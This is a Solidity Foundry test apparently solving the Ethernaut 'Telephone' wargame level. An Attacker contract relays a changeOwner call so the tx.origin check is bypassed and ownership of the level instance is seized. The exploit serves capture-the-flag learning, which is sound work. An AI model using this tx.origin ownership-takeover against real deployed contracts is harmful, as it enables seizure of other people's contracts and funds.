pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "src/04-Telephone/TelephoneFactory.sol";
import "src/Ethernaut.sol";
import "../utils/vm.sol";

contract C_TelephoneTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    Attacker attacker;
    
    address internal constant ALICE = address(0xAA);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        attacker = new Attacker();
    }

    function testTelephoneHack() public {

        /////////////////
        // LEVEL SETUP //
        /////////////////

        TelephoneFactory telephoneFactory = new TelephoneFactory();
        ethernaut.registerLevel(telephoneFactory);
        vm.startPrank(ALICE);
        address levelAddress = ethernaut.createLevelInstance(telephoneFactory);
        Telephone ethernautTelephone = Telephone(payable(levelAddress));


        //////////////////
        // LEVEL ATTACK //
        //////////////////

        attacker.attack(address(ethernautTelephone), ALICE);
        emit log_named_address("new owner: ", ethernautTelephone.owner());

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assertTrue(levelSuccessfullyPassed);
    }
}

contract Attacker{
    function attack(address toCall, address addr) public {
        bytes memory data = abi.encodeWithSignature("changeOwner(address)", addr);
        toCall.call(data);
    }
}
